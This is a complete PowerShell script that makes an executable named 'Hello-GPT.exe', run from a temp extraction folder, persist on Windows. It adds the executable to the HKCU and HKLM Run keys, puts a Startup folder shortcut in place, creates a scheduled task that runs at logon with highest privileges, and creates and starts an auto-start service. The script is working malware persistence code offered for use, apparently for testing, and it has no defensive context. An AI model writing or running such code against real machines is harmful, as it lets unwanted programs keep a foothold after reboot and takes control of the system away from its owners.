# Set the full path to your EXE file here
$exePath = "C:\Users\Administrator\AppData\Local\Temp\RarSFX1\Hello-GPT.exe"

# 1. Registry Run Key (Current User)
try {
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "PersistenceRunHKCU" `
        -Value $exePath `
        -PropertyType String -Force
    Write-Output "✔️ Added HKCU Run key persistence"
} catch {
    Write-Warning "❌ Failed to add HKCU Run key: $_"
}

# 2. Registry Run Key (Local Machine - Admin Required)
try {
    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "PersistenceRunHKLM" `
        -Value $exePath `
        -PropertyType String -Force
    Write-Output "✔️ Added HKLM Run key persistence"
} catch {
    Write-Warning "❌ Failed to add HKLM Run key (requires admin): $_"
}

# 3. Startup Folder Shortcut
try {
    $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\persistence.lnk"
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = $exePath
    $Shortcut.Save()
    Write-Output "✔️ Added Startup folder shortcut"
} catch {
    Write-Warning "❌ Failed to create Startup shortcut: $_"
}

# 4. Scheduled Task (Run at user logon)
try {
    schtasks /create /tn "PersistenceTask" /tr "`"$exePath`"" /sc onlogon /rl highest /f | Out-Null
    Write-Output "✔️ Created scheduled task for persistence"
} catch {
    Write-Warning "❌ Failed to create scheduled task: $_"
}

# 5. Windows Service (Admin only)
try {
    New-Service -Name "PersistenceService" -BinaryPathName $exePath -StartupType Automatic
    Start-Service -Name "PersistenceService"
    Write-Output "✔️ Created and started persistent service"
} catch {
    Write-Warning "❌ Failed to create service (admin needed): $_"
}

Write-Output "`n✅ Persistence setup complete. Reboot to test the effects."
